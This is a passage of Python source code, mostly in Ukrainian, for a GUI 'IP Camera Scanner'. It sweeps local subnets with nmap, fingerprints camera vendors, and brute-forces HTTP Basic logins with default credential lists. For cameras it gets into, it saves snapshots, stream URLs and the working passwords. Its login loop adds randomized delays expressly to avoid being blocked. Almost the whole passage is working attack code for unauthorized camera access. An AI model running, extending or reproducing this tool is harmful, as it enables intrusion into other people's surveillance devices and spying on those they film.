        if os.path.exists(temp_file) and os.path.getsize(temp_file) > 0:
            
            if os.path.exists("saved_cameras.json"):
                os.remove("saved_cameras.json")
            os.rename(temp_file, "saved_cameras.json")
            
        log(f"[+] Saved {len(merged_cameras)} cameras to saved_cameras.json")
        return True
    except Exception as e:
        log(f"[!] Error saving cameras: {e}")
        return False

def load_cameras_from_file():
    """Load previously saved cameras"""
    try:
        if not os.path.exists("saved_cameras.json"):
            return False
            
        with open("saved_cameras.json", "r") as f:
            cameras_data = json.load(f)
            
        
        for ip, data in cameras_data.items():
            successful_streams[ip] = data
            
        log(f"[+] Loaded {len(cameras_data)} saved cameras")
        return True
    except Exception as e:
        log(f"[!] Error loading saved cameras: {e}")
        return False

def identify_camera_ips_enhanced(subnet):
    """Покращена функція виявлення камер з підтримкою нестандартних портів і глибшим аналізом"""
    log(f"[*] Розширений пошук камер в підмережі {subnet}")
    scanner = nmap.PortScanner()
    
    try:
        
        common_ports = ','.join(map(str, CAMERA_PORTS[:20]))  
        scanner.scan(hosts=subnet, arguments=f'-p {common_ports} --open -T4')
        potential_cameras = []
        seen_ips = set()  
        
        
        for host in scanner.all_hosts():
            
            if host in seen_ips or host in known_routers or host in potential_camera_ips or host in successful_streams:
                log(f"[*] Пропускаємо IP: {host} (вже в списку або роутер)")
                continue
                
            
            try:
                protocol = "https" if 443 in [port for port in scanner[host].get('tcp', {})] else "http"
                session = requests.Session()
                response = session.get(f"{protocol}://{host}:80/", timeout=1.0, verify=False)
                if is_router(host, response):
                    log(f"[*] IP {host} виявлено як роутер, пропускаємо")
                    continue
            except:
                pass  
                
            if 'tcp' in scanner[host]:
                for port in CAMERA_PORTS[:20]:  
                    if port in scanner[host]['tcp'] and scanner[host]['tcp'][port]['state'] == 'open':
                        
                        is_camera = False
                        try:
                            
                            protocol = "https" if port in [443, 8443] else "http"
                            session = requests.Session()
                            response = session.get(f"{protocol}://{host}:{port}/", 
                                                 timeout=1.0, verify=False)
                            
                            
                            if response.status_code in [200, 401, 403]:
                                is_camera = True
                        except:
                            
                            if port in [80, 443, 8080, 8000, 554, 88, 9000, 37777, 34567]:
                                is_camera = True
                                
                        if is_camera:
                            potential_cameras.append((host, port))
                            potential_camera_ips.add(host)
                            seen_ips.add(host)  
                            log(f"[+] Знайдено пристрій з відкритим портом камери на {host}:{port}")
                            break
        
        
        if len(potential_cameras) < 1:  
            log("[*] Запуск розширеного сканування нестандартних портів...")
            
            high_ports = "5000-10000,32768-60000"
            
            
            scanner.scan(hosts=subnet, arguments=f'-p {high_ports} --max-rtt-timeout 200ms --max-retries 1 --min-rate 400 --open')
            
            for host in scanner.all_hosts():
                
                if host in seen_ips or host in known_routers or host in potential_camera_ips or host in successful_streams:
                    continue
                    
                if 'tcp' in scanner[host]:
                    for port in scanner[host]['tcp']:
                        if scanner[host]['tcp'][port]['state'] == 'open':
                            
                            try:
                                
                                protocol = "http"  
                                session = requests.Session()
                                response = session.get(f"{protocol}://{host}:{int(port)}/", 
                                                     timeout=0.8, verify=False)
                                
                                
                                headers = response.headers
                                if any(cam_vendor in headers.get('Server', '').lower() 
                                       for cam_vendor in ['hikvision', 'dahua', 'axis', 'camera']):
                                    potential_cameras.append((host, int(port)))
                                    potential_camera_ips.add(host)
                                    seen_ips.add(host)  
                                    log(f"[+] Знайдено пристрій з нестандартним відкритим портом на {host}:{port}")
                                    break
                                    
                                
                                content = response.text.lower()
                                if any(keyword in content for keyword in 
                                       ['camera', 'ipcam', 'webcam', 'surveillance', 'cctv', 'dvr']):
                                    potential_cameras.append((host, int(port)))
                                    potential_camera_ips.add(host)
                                    seen_ips.add(host)  
                                    log(f"[+] Знайдено пристрій з нестандартним відкритим портом на {host}:{port}")
                                    break
                            except Exception:
                                
                                continue
        
        
        confirmed_cameras = []
        
        for host, port in potential_cameras:
            
            try:
                if is_likely_camera(host, port):
                    confirmed_cameras.append((host, port))
                    log(f"[+] Підтверджено камеру на {host}:{port}")
                    continue

                
                service_scan = scanner.scan(hosts=host, arguments=f'-sV -p {port} -T4')
                if 'tcp' in scanner[host] and port in scanner[host]['tcp']:
                    service = scanner[host]['tcp'][port]
                    
                    service_info = f"{service.get('product', '')} {service.get('version', '')} {service.get('extrainfo', '')}"
                    service_name = service.get('name', '').lower()
                    
                    
                    if (any(cam_sig in service_info.lower() for cam_sig in CAMERA_SIGNATURES) or
                        any(cam_sig in service_name for cam_sig in ['rtsp', 'http', 'streaming'])):
                        confirmed_cameras.append((host, port))
                        log(f"[+] Виявлено сервіс камери: {host}:{port} - {service_info}")
            except Exception as e:
                log(f"[!] Помилка при скануванні {host}:{port}: {e}")
                
        
        
        if confirmed_cameras:
            log(f"[+] Знайдено {len(confirmed_cameras)} підтверджених камер")
            
            return list(set(host for host, port in confirmed_cameras))
        elif potential_cameras:
            log(f"[+] Знайдено {len(potential_cameras)} потенційних камер (непідтверджених)")
            
            return list(set(host for host, port in potential_cameras))
        
        return []
    except Exception as e:
        log(f"[!] Помилка ідентифікації камер: {e}")
        return []


def is_likely_camera(host, port):
    """Визначає, чи є пристрій камерою на основі веб-інтерфейсу та відповідей HTTP"""
    try:
        
        protocol = "https" if port in [443, 8443] else "http"
        url = f"{protocol}://{host}:{port}/"
        
        
        session = requests.Session()
        response = session.get(url, timeout=2.0, verify=False)
        
        
        registry = VendorRegistry()
        vendor = registry.detect_vendor(session, url)  
        
        
        if vendor != "generic":
            log(f"[+] Виявлено камеру виробника {vendor} на {host}:{port}")
            return True
        
        
        headers = response.headers
        server_header = headers.get('Server', '').lower()
        content_type = headers.get('Content-Type', '').lower()
        
        
        if any(cam_vendor in server_header for cam_vendor in ['hikvision', 'dahua', 'axis', 'sony', 'mobotix', 'vivotek']):
            log(f"[+] Камера виявлена за заголовком Server: {server_header}")
            return True
            
        
        content = response.text.lower()
        camera_keywords = [
            'camera', 'ipcam', 'webcam', 'surveillance', 'cctv', 'dvr', 'nvr', 'ptz', 
            'mjpeg', 'rtsp', 'onvif', 'login', 'videocamera', 'streaming'
        ]
        
        if any(keyword in content for keyword in camera_keywords):
            log(f"[+] Знайдено ключові слова камери у вмісті сторінки на {host}:{port}")
            return True
            
        
        image_patterns = ['snapshot', 'image.jpg', 'video.mjpg', 'mjpeg', 'videostream']
        if any(pattern in content for pattern in image_patterns):
            log(f"[+] Знайдено теги зображень характерні для камери на {host}:{port}")
            return True
            
        
        js_patterns = ['ptz', 'pan', 'tilt', 'zoom', 'getimage', 'getvideo', 'videostream', 'cameraid']
        if any(pattern in content for pattern in js_patterns):
            log(f"[+] Знайдено JavaScript функції для керування камерою на {host}:{port}")
            return True
        
        
        if 'image/jpeg' in content_type or 'image/jpg' in content_type:
            log(f"[+] Порт {host}:{port} напряму повертає зображення")
            return True
            
        
        common_paths = [
            '/onvif/snapshot', 
            '/cgi-bin/snapshot.cgi',
            '/snapshot.jpg',
            '/image.jpg',
            '/video.mjpg'
        ]
        
        for path in common_paths:
            try:
                img_url = f"{url.rstrip('/')}{path}"
                img_resp = session.get(img_url, timeout=1.0, verify=False)
                if img_resp.status_code == 200 and ('image/' in img_resp.headers.get('Content-Type', '') or 
                                                 'video/' in img_resp.headers.get('Content-Type', '')):
                    log(f"[+] Знайдено потік зображення/відео на {img_url}")
                    return True
            except:
                continue
                
        return False
    except Exception as e:
        log(f"[!] Помилка при аналізі {host}:{port}: {e}")
        return False

def is_router(ip, response):
    """Покращена перевірка чи є пристрій роутером, а не камерою"""
    
    router_keywords = [
        "router", "gateway", "mikrotik", "tp-link", "asus", "d-link router", 
        "netgear", "admin panel", "setup", "statistics", "bandwidth",
        "wireless", "wi-fi", "wifi settings", "wan", "lan", "dhcp", "port forwarding",
        "firewall", "qos", "firmware", "router configuration", "administration", 
        "broadband", "modem", "network settings"
    ]
    
    
    router_vendors = [
        "tp-link", "asus", "netgear", "linksys", "d-link", "tenda", "huawei", 
        "zte", "xiaomi", "mikrotik", "ubiquiti", "cisco", "belkin", "buffalo", 
        "edimax", "sagemcom", "technicolor", "fritz"
    ]
    
    
    common_router_ips = [
        "192.168.0.1", "192.168.1.1", "192.168.0.254", "192.168.1.254", 
        "10.0.0.1", "10.0.0.138", "10.1.1.1", "192.168.2.1", "192.168.100.1", 
        "192.168.254.254", "192.168.10.1", "192.168.8.1", "192.168.123.254",
        "192.168.88.1", "192.168.0.2"
    ]
    
    
    if ip in common_router_ips:
        return True
    
    
    if ip.split(".")[-1] in ["1", "254"]:
        
        if response:
            try:
                content = response.text.lower()
                
                if any(keyword in content for keyword in router_keywords):
                    return True
                
                
                headers = response.headers
                server = headers.get('Server', '').lower()
                if any(vendor in server for vendor in router_vendors):
                    return True
            except:
                pass
    
    
    if response:
        try:
            headers = response.headers
            server = headers.get('Server', '').lower()
            content = response.text.lower()
            
            
            if any(vendor in server for vendor in router_vendors):
                return True
                
            
            router_models = ["wr", "dir", "wrt", "rt-", "rt_", "archer", "nighthawk"]
            if any(model in content for model in router_models) and any(keyword in content for keyword in router_keywords):
                return True
                
            
            router_features = ["dhcp", "wan", "lan", "wireless", "administration", "firewall"]
            router_feature_count = sum(1 for feature in router_features if feature in content)
            if router_feature_count >= 3:  
                return True
        except:
            pass
            
    return False

def scan_networks_with_nmap():
    """Сканує мережу і повертає список потенційних камер з деталями"""
    log("[*] Початок сканування мережі з nmap...")
    
    
    subnets = get_all_subnets()
    log(f"[*] Знайдено {len(subnets)} підмереж для сканування: {', '.join(subnets)}")
    
    
    detected_cameras_dict = {}
    
    
    for subnet in subnets:
        log(f"[*] Сканування підмережі {subnet}")
        
        try:
            
            scanner = nmap.PortScanner()
            scanner.scan(hosts=subnet, arguments='-sV -p 80,443,554,8000,8080,8081,37777,34567,9000,8443 --open')
            
            
            for host in scanner.all_hosts():
                camera_info = {"ip": host, "ports": [], "vendor": "unknown", "detection_type": ""}
                
                
                try:
                    
                    protocol = "http"
                    session = requests.Session()
                    response = session.get(f"{protocol}://{host}:80/", timeout=1.0, verify=False)
                    if is_router(host, response):
                        log(f"[*] IP {host} виявлено як роутер, пропускаємо")
                        continue
                except:
                    pass  
                
                
                if 'tcp' in scanner[host]:
                    for port in scanner[host]['tcp']:
                        if scanner[host]['tcp'][port]['state'] == 'open':
                            service_info = scanner[host]['tcp'][port]
                            service_name = service_info.get('name', '').lower()
                            product = service_info.get('product', '').lower()
                            
                            
                            port_info = {
                                "port": port, 
                                "service": service_name,
                                "product": product
                            }
                            camera_info["ports"].append(port_info)
                            
                            
                            camera_keywords = [
                                "camera", "webcam", "ipcam", "hikvision", "dahua", "axis", "foscam", 
                                "reolink", "onvif", "rtsp", "dlink", "d-link", "cctv", "surveillance", 
                                "vivotek", "mobotix", "avtech", "geovision", "sony", "panasonic"
                            ]
                            
                            
                            for keyword in camera_keywords:
                                if keyword in service_name or keyword in product:
                                    camera_info["detection_type"] = "keyword"
                                    camera_info["vendor"] = determine_vendor(service_name, product)
                                    log(f"[+] Знайдено камеру за ключовим словом: {host}:{port} - {product}")
                                    break
                
                
                if not camera_info["detection_type"] and camera_info["ports"]:
                    camera_ports = [80, 443, 554, 8000, 8080, 8081, 37777, 34567, 9000, 8443]
                    for port_info in camera_info["ports"]:
                        if port_info["port"] in camera_ports:
                            camera_info["detection_type"] = "common_port"
                            log(f"[+] Потенційна камера за портом: {host}:{port_info['port']}")
                            break
                
                
                
                if camera_info["detection_type"]:
                    
                    if host in detected_cameras_dict:
                        
                        existing_ports = {p["port"] for p in detected_cameras_dict[host]["ports"]}
                        for new_port in camera_info["ports"]:
                            if new_port["port"] not in existing_ports:
                                detected_cameras_dict[host]["ports"].append(new_port)
                        
                        
                        if camera_info["detection_type"] == "keyword" and detected_cameras_dict[host]["detection_type"] != "keyword":
                            detected_cameras_dict[host]["detection_type"] = "keyword"
                            detected_cameras_dict[host]["vendor"] = camera_info["vendor"]
                    else:
                        detected_cameras_dict[host] = camera_info
            
            
            
        except Exception as e:
            log(f"[!] Помилка при скануванні {subnet}: {str(e)}")
    
    
    detected_cameras = list(detected_cameras_dict.values())
    log(f"[+] Сканування завершено, знайдено {len(detected_cameras)} потенційних камер.")
    return detected_cameras

def determine_vendor(service_name, product):
    """Визначає виробника камери за сервісом і продуктом"""
    vendors = {
        "hikvision": ["hikvision", "hik-vision", "hik vision"],
        "dahua": ["dahua", "dh-"],
        "dlink": ["dlink", "d-link"],
        "axis": ["axis"],
        "foscam": ["foscam", "amcrest"],
        "reolink": ["reolink"],
        "vivotek": ["vivotek"],
        "mobotix": ["mobotix"],
        "avtech": ["avtech"],
        "sony": ["sony"],
        "panasonic": ["panasonic"]
    }
    
    text = (service_name + " " + product).lower()
    
    for vendor, keywords in vendors.items():
        for keyword in keywords:
            if keyword in text:
                return vendor
                
    return "generic"

def try_find_camera_streams_on_port(ip, port):
    """Пробує знайти потоки камери на конкретному порті з ефективним перебором шляхів"""
    session = requests.Session()
    
    
    protocols = ["https"] if port in [443, 8443] else ["http"]
    if port not in [443, 8443]:
        protocols.append("http")  
    
    for protocol in protocols:
        
        base_url = f"{protocol}://{ip}:{port}"
        
        
        try:
            response = session.get(f"{base_url}/", timeout=HTTP_TIMEOUT, verify=False)
            content = response.text.lower()
            headers = response.headers
            
            
            vendor = None
            for cam_vendor in ['hikvision', 'dahua', 'axis', 'sony', 'panasonic', 
                              'vivotek', 'mobotix', 'reolink', 'foscam', 'amcrest']:
                if cam_vendor in content or cam_vendor in headers.get('Server', '').lower():
                    vendor = cam_vendor
                    log(f"[+] Визначено виробника камери: {vendor}")
                    break
            
            
            paths_to_try = []
            
            if vendor:
                
                vendor_paths = get_vendor_specific_paths(vendor)
                paths_to_try.extend(vendor_paths)
            
            
            paths_to_try.extend([
                '/onvif/snapshot',
                '/Streaming/Channels/1/picture',
                '/snap.jpg',
                '/snapshot.jpg',
                '/image/jpeg.cgi',
                '/video.mjpg',
                '/video.cgi'
            ])
            
            
            for path in paths_to_try:
                if stop_event.is_set():
                    return False
                
                url = f"{base_url}{path}"
                
                try:
                    r = session.get(url, timeout=HTTP_TIMEOUT, verify=False)
                    
                    
                    content_type = r.headers.get('Content-Type', '').lower()
                    
                    if r.status_code == 200 and ('image/' in content_type or 'video/' in content_type or 'multipart' in content_type):
                        log(f"[+] Знайдено медіа потік: {url} ({content_type})")
                        
                        
                        stream_type = 'mjpeg' if ('mjpeg' in content_type or 'multipart' in content_type) else 'http'
                        
                        
                        successful_streams[ip] = {
                            'url': url,
                            'type': stream_type,
                            'auth': None,  
                            'base_url': base_url
                        }
                        
                        if 'image/' in content_type:
                            successful_streams[ip]['photo_url'] = url
                            
                            
                            filename = f"camera_{ip}_snapshot.jpg"
                            with open(filename, "wb") as f:
                                f.write(r.content)
                            successful_streams[ip]['snapshot_path'] = filename
                            log(f"[+] Зображення збережено в {filename}")
                        
                        if 'video/' in content_type or 'multipart' in content_type:
                            successful_streams[ip]['video_url'] = url
                            
                        return True
                except Exception as e:
                    continue
                    
            
            if response.status_code == 200 or response.status_code == 401:
                
                return try_camera_auth(ip, port, protocol)
                
        except Exception as e:
            
            continue
            
    return False


def get_vendor_specific_paths(vendor):
    """Повертає специфічні шляхи для конкретного виробника камери з використанням плагінів"""
    registry = VendorRegistry()
    vendor_plugin = registry.get_vendor_by_name(vendor)
    
    if not vendor_plugin:
        
        vendor_plugin = registry.get_vendor_by_name("generic")
        
    
    paths = []
    
    
    paths.extend(vendor_plugin.get_paths("photo"))
    
    
    paths.extend(vendor_plugin.get_paths("video"))
    
    
    return list(dict.fromkeys(paths))

class CameraAuthManager:
    """Керує процесом автентифікації для різних типів камер"""
    
    def __init__(self, session, ip, port, protocol, vendor="generic"):
        self.session = session
        self.ip = ip
        self.port = port
        self.protocol = protocol
        self.base_url = f"{protocol}://{ip}:{port}"
        self.vendor = vendor
        self.registry = VendorRegistry()  
        self.checked_urls = set()  
        
    def try_auth(self):
        """Універсальний метод автентифікації з використанням плагінів"""
        
        if not self.vendor or self.vendor == "generic":
            self.vendor = enhance_vendor_detection(self.session, self.base_url)
            
        log(f"[*] Визначений виробник камери: {self.vendor}")
        
        
        vendor_plugin = self.registry.get_vendor_by_name(self.vendor)
        if not vendor_plugin:
            log(f"[!] Плагін для виробника {self.vendor} не знайдено, використовуємо універсальний")
            vendor_plugin = self.registry.get_vendor_by_name("generic")
        
        
        plugin_credentials = vendor_plugin.get_credentials()
        if plugin_credentials:
            log(f"[*] Спроба автентифікації зі специфічними обліковими даними для {self.vendor} ({len(plugin_credentials)} комбінацій)")
            if self._try_credentials_list(plugin_credentials, vendor_plugin):
                return True
            log(f"[*] Всі специфічні облікові дані для {self.vendor} невдалі, пробуємо загальні")
        
        
        plugin_universal_credentials = self.registry.get_all_credentials()
        log(f"[*] Спроба автентифікації з універсальними обліковими даними плагінів ({len(plugin_universal_credentials)} комбінацій)")
        if self._try_credentials_list(plugin_universal_credentials, vendor_plugin):
            return True
            
        
        global CREDENTIALS
        log(f"[*] Спроба автентифікації з повним списком облікових даних ({len(CREDENTIALS)} комбінацій)")
        return self._try_credentials_list(CREDENTIALS, vendor_plugin)

    
    def _try_credentials_list(self, credentials, vendor_plugin):
        """Пробує список облікових даних і повертає True при успіху"""
        for user, password in credentials:
            log(f"[*] Спроба автентифікації з {user}:{password}")
            
            auth = HTTPBasicAuth(user, password) if user else None
            
            try:
                
                response = self.session.get(f"{self.base_url}/", 
                                        auth=auth,
                                        timeout=2.0,
                                        verify=False,
                                        allow_redirects=True)
                
                
                if self._verify_auth_success(response, user, password):
                    log(f"[+] Успішна автентифікація з {user}:{password}")
                    
                    
                    photo_url, video_url = vendor_plugin.find_media_urls(
                        self.session, self.base_url, auth)
                    
                    
                    if not (photo_url or video_url) and self.vendor != "generic":
                        log(f"[*] Специфічний плагін не знайшов медіа URL, пробуємо універсальний")
                        generic_plugin = self.registry.get_vendor_by_name("generic")
                        if generic_plugin:
                            photo_url, video_url = generic_plugin.find_media_urls(
                                self.session, self.base_url, auth)
                    
                    
                    if photo_url or video_url:
                        successful_streams[self.ip] = {
                            'base_url': self.base_url,
                            'auth': (user, password) if auth else None,
                            'auth_type': 'basic',
                            'photo_url': photo_url,
                            'video_url': video_url,
                            'vendor': self.vendor,
                            'cookies': dict(self.session.cookies)
                        }
                        
                        
                        if photo_url:
                            save_photo(self.session, photo_url, self.ip, auth)
                            
                        return True
                    else:
                        log(f"[!] Автентифікація успішна, але не знайдено медіа URL")
                        
            except Exception as e:
                log(f"[!] Помилка при спробі автентифікації: {str(e)[:50]}")
        
        return False
    
    def _verify_auth_success(self, response, user, password):
        """Універсальна перевірка успішної автентифікації"""
        if response.status_code != 200:
            return False
            
        content = response.text.lower()
        
        
        auth_failure_indicators = [
            "login", "password", "authentication failed", "invalid", "incorrect",
            "login page", "please login", "user name", "username", "unauthorized"
        ]
        
        
        if any(indicator in content for indicator in auth_failure_indicators):
            return False
            
        
        try:
            
            auth = HTTPBasicAuth(user, password) if user else None
            test_url = f"{self.base_url}/onvif/snapshot"
            test_response = self.session.get(test_url, 
                                        timeout=1.5, 
                                        verify=False,
                                        auth=auth)
            
            if test_response.status_code == 200 and 'image' in test_response.headers.get('Content-Type', ''):
                return True
        except:
            pass
            
        
        return True

    def try_vendor_auth(self):
        """Спроба автентифікації з плагіном виробника"""
        return self.try_auth()

def start_targeted_scan(camera, form, scan_mode):
    """Запускає таргетоване сканування з вибраними параметрами"""
    global progress_var, status_var, root, successful_streams
    log(f"[*] Початок сканування {camera['ip']} з режимом {scan_mode}")
    status_var.set(f"Сканування {camera['ip']}...")
    progress_var.set(10)
    root.update_idletasks()
    
    try:
        
        session = requests.Session()
        ip = camera['ip']
        port = form['port']
        protocol = form['protocol']
        base_url = f"{protocol}://{ip}:{port}"
        
        
        vendor = camera['vendor']
        if vendor == "unknown" or vendor == "generic":
            
            try:
                registry = VendorRegistry()
                vendor = enhance_vendor_detection(session, base_url)
            except:
                vendor = "generic"
        
        log(f"[*] Визначений виробник: {vendor}")
        progress_var.set(20)
        root.update_idletasks()
        
        
        auth_manager = CameraAuthManager(session, ip, port, protocol, vendor)
        
        
        success = False
        
        if "_vendor" in scan_mode:
            
            vendor_name = scan_mode.split('_')[0]
            log(f"[*] Використання специфічного режиму для {vendor_name}")
            
            
            auth_manager.vendor = vendor_name
            
            
            success = auth_manager.try_auth()
        else:  
            log(f"[*] Використання універсального режиму сканування")
            success = auth_manager.try_auth()
        
        
        progress_var.set(90)
        status_var.set(f"Завершення сканування {camera['ip']}...")
        root.update_idletasks()
        
        if success or ip in successful_streams:
            log(f"[+] Сканування завершено успішно для {ip}")
            
            
            if ip in successful_streams:
                log(f"[+] Інформація про камеру:")
                log(f"    IP: {ip}")
                log(f"    URL: {successful_streams[ip].get('base_url', 'Невідомо')}")
                log(f"    Автентифікація: {successful_streams[ip].get('auth', 'Не потрібна')}")
                log(f"    URL фото: {successful_streams[ip].get('photo_url', 'Не знайдено')}")
                log(f"    URL відео: {successful_streams[ip].get('video_url', 'Не знайдено')}")
                
                
                save_cameras_to_file()
                
                
                root.after(1000, open_camera_viewer)
            else:
                log(f"[!] Автентифікація успішна, але не вдалося знайти потоки відео/фото")
        else:
            log(f"[!] Не вдалося отримати доступ до камери {ip}")
            messagebox.showinfo("Результат сканування", f"Не вдалося отримати доступ до камери {ip}")
    
    except Exception as e:
        log(f"[!] Помилка під час сканування: {str(e)}")
        traceback.print_exc()
        messagebox.showerror("Помилка", f"Сталася помилка під час сканування: {str(e)}")
    
    finally:
        progress_var.set(100)
        status_var.set("Сканування завершено")
        root.update_idletasks()

def is_valid_ip(ip_input):
    """Enhanced validation for IP address or IP:port format"""
    try:
        
        if ":" in ip_input:
            ip, port = ip_input.split(":", 1)
            
            if not port.isdigit() or int(port) < 1 or int(port) > 65535:
                return False
        else:
            ip = ip_input
            
        
        parts = ip.split(".")
        if len(parts) != 4:
            return False
        for part in parts:
            if not part.isdigit():
                return False
            if int(part) < 0 or int(part) > 255:
                return False
        return True
    except:
        return False

def scan_specific_ip(ip_input):
    """Enhanced scanning for IP address with optional port specification with better error handling"""
    global progress_var, status_var, root
    
    
    def safe_error_message(title, message):
        
        root.after(0, lambda: messagebox.showerror(title, message))
        root.after(0, lambda: status_var.set("Некоректне значення IP"))

    if not is_valid_ip(ip_input):
        safe_error_message("Помилка", "Будь ласка, введіть коректну IP-адресу або IP:порт формат")
        return
    
    specified_port = None
    if ":" in ip_input:
        ip, port_str = ip_input.split(":", 1)
        specified_port = int(port_str)
        log(f"[*] Сканування IP: {ip} з вказаним портом {specified_port}")
    else:
        ip = ip_input
        log(f"[*] Сканування IP: {ip} (порт не вказано)")
       
    stop_event.clear()
    progress_var.set(0)
    status_var.set(f"Сканування IP: {ip}" + (f" з портом {specified_port}" if specified_port else ""))
    root.update_idletasks()
    
    try:
        camera = {
            "ip": ip,
            "ports": [],
            "vendor": "unknown",
            "detection_type": "manual"
        }
        
        if specified_port:
            camera["ports"].append({
                "port": specified_port,
                "service": "unknown",
                "product": "unknown"
            })
            progress_var.set(40)
            status_var.set(f"Використання вказаного порту {specified_port} для {ip}")
            root.update_idletasks()
            
            try:
                protocol = "https" if specified_port in [443, 8443] else "http"
                session = requests.Session()
                response = session.get(f"{protocol}://{ip}:{specified_port}/", 
                                    timeout=2.0, verify=False)
                vendor = enhance_vendor_detection(session, f"{protocol}://{ip}:{specified_port}")
                if vendor != "generic":
                    camera["vendor"] = vendor
                    log(f"[+] Визначено ймовірного виробника: {vendor}")
            except:
                log("[!] Не вдалося визначити виробника, використання generic")
                
            progress_var.set(60)
            root.update_idletasks()

            show_form_detection_window(camera)
            return
        
        scanner = nmap.PortScanner()
        common_ports = ','.join(map(str, CAMERA_PORTS[:20]))
        scanner.scan(hosts=ip, arguments=f'-p {common_ports} --open -T4')
        
        if ip in scanner.all_hosts():
            progress_var.set(30)
            status_var.set(f"Виявлено відкриті порти на {ip}...")
            root.update_idletasks()
            
            if 'tcp' in scanner[ip]:
                for port in scanner[ip]['tcp']:
                    if scanner[ip]['tcp'][port]['state'] == 'open':
                        camera["ports"].append({
                            "port": port,
                            "service": scanner[ip]['tcp'][port].get('name', ''),
                            "product": scanner[ip]['tcp'][port].get('product', '')
                        })
            
            if camera["ports"]:
                progress_var.set(60)
                status_var.set(f"Знайдено {len(camera['ports'])} відкритих портів на {ip}")
                root.update_idletasks()
                log(f"[+] Знайдено {len(camera['ports'])} відкритих портів на {ip}")
                
                try:
                    protocol = "https" if 443 in [p["port"] for p in camera["ports"]] else "http"
                    session = requests.Session()
                    response = session.get(f"{protocol}://{ip}:{camera['ports'][0]['port']}/", 
                                        timeout=2.0, verify=False)
                    vendor = enhance_vendor_detection(session, f"{protocol}://{ip}:{camera['ports'][0]['port']}")
                    if vendor != "generic":
                        camera["vendor"] = vendor
                        log(f"[+] Визначено ймовірного виробника: {vendor}")
                except:
                    pass
                
                show_form_detection_window(camera)
                return
        
        progress_var.set(100)
        status_var.set(f"Не знайдено портів камери на {ip}")
        log(f"[!] Не знайдено портів камери на {ip}")
        messagebox.showinfo("Результат сканування", f"Не знайдено портів камери на {ip}")
        
    except Exception as e:
        log(f"[!] Помилка при скануванні IP {ip}: {str(e)}")
        traceback.print_exc()
        messagebox.showerror("Помилка", f"Сталася помилка під час сканування: {str(e)}")
        
    finally:
        progress_var.set(100)
        status_var.set("Сканування завершено")
        root.update_idletasks()

def start_new_scan():
    """Початок нового процесу сканування"""
    global progress_var, status_var, root, stop_event
    if stop_event.is_set():
        stop_event.clear()
        
    progress_var.set(0)
    status_var.set("Початок сканування мережі...")
    root.update_idletasks()
    
    try:
        detected_cameras = scan_networks_with_nmap()
        
        if not detected_cameras:
            log("[!] Не знайдено потенційних камер у мережі")
  
            root.after(0, lambda: messagebox.showinfo("Результат сканування", "Не знайдено потенційних камер у мережі"))
            status_var.set("Сканування завершено - камери не знайдені")
            progress_var.set(100)
            return
            
        root.after(0, lambda: show_camera_selection_window(detected_cameras))
        
    except Exception as e:
        log(f"[!] Помилка під час сканування: {str(e)}")
        traceback.print_exc()
  
        root.after(0, lambda: messagebox.showerror("Помилка", f"Сталася помилка під час сканування: {str(e)}"))
        
    finally:
        progress_var.set(100)
        status_var.set("Сканування завершено")
        root.update_idletasks()

def delay_between_attempts(attempt_count, ip):
    """Інтелектуальні затримки між спробами автентифікації для запобігання блокуванню"""
    base_delay = 0.5
    
    if attempt_count > 20:
        delay = base_delay * 4  
    elif attempt_count > 10:
        delay = base_delay * 2  
    elif attempt_count > 5:
        delay = base_delay * 1.5  
    else:
        delay = base_delay  
    
    random_factor = random.uniform(0.75, 1.25)
    final_delay = delay * random_factor
    

    time.sleep(final_delay)
    return final_delay

if __name__ == "__main__":
    try:

        import warnings
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        warnings.filterwarnings("ignore")

        global output_box
        stop_event = Event()
        root = create_main_window()
        
        output_frame = ttk.LabelFrame(root, text="Log Output")
        output_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        output_box = scrolledtext.ScrolledText(output_frame, wrap=tk.WORD)
        output_box.pack(fill=tk.BOTH, expand=True)

        log("[*] IP Camera Scanner starting...")
        
        registry = load_vendor_plugins()
        log(f"[*] Завантажено {len(registry.vendors)} плагінів виробників камер")

        root.mainloop()
        
    except Exception as e:
 
        import traceback
        print(f"Error starting application: {e}")
        print(traceback.format_exc())
        
        input("Press Enter to exit...")

